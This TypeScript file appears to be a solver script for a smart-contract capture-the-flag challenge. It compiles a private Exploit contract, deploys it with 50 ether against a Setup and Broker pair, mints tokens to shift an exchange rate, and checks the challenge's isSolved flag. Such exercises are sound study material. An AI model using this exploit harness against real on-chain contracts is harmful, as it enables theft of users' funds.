import Web3 from 'web3';
import { SolCompiler } from '../../../lib/compiler';
import { Sender } from '../../../lib/sender';
import setting from '../setting.json';

const abi = require('ethereumjs-abi');
const web3 = new Web3();

const input = (findFileContent: any): any => {
    return {
        language: 'Solidity',
        sources: {
            //  public/<FILE_NAME>.sol
            'public/Setup.sol': {
                content: findFileContent('public/Setup.sol')
            },
            'public/Broker.sol': {
                content: findFileContent('public/Broker.sol')
            },

            //  private/<FILE_NAME>.sol
            'private/Exploit.sol': {
                content: findFileContent('private/Exploit.sol')
            },
        },
        settings: {
            outputSelection: {
                '*': {
                    '*': ['*']
                }
            }
        }
    }
}

/**
 * 
 * @param exploiter 
 * @param setupAddress 
 * @returns true if solved, false otherwise.
 */
export const solve = async (exploiter: Sender, setupAddress: string): Promise<boolean> => {
    const compiler = new SolCompiler(setting.solc.version, setting.problem.name);
    const {success, output} = await compiler.compile(input);
    if(!success){
        console.log('fail compilation');
        return false;
    }
    const bytecode = output['contracts']['private/Exploit.sol']['Exploit'].evm.bytecode.object;
    const exploitContractAddress = 
        await exploiter.deployContract(bytecode+'000000000000000000000000'+setupAddress.slice(2), {
            value: '50',
            unit: 'ether'
        });
    console.log('private/Exploit.sol', exploitContractAddress);

    {
        const calldata = abi.simpleEncode('getRate()');
        const res0 = await exploiter.viewContract(exploitContractAddress, calldata);
        console.log('rate:', web3.utils.hexToNumberString(res0));
    }
    {
        const calldata = abi.simpleEncode('getTokenAddress()');
        const res0 = await exploiter.viewContract(exploitContractAddress, calldata);
        console.log('TOKEN:', res0);
    }
    {
        const calldata = abi.simpleEncode('mint()');
        const res0 = await exploiter.callContract(exploitContractAddress, calldata, {
            value: '50',
            unit: 'ether'
        });
        console.log('minted:', res0);
    }
    {
        const calldata = abi.simpleEncode('getRate()');
        const res0 = await exploiter.viewContract(exploitContractAddress, calldata);
        console.log('rate:', web3.utils.hexToNumberString(res0));
    }
    

    /* solve check ----------------------------------------------------- */ 
    const data = abi.simpleEncode('isSolved()');
    const res = await exploiter.viewContract(setupAddress, data)
    return res === '0x0000000000000000000000000000000000000000000000000000000000000001';
}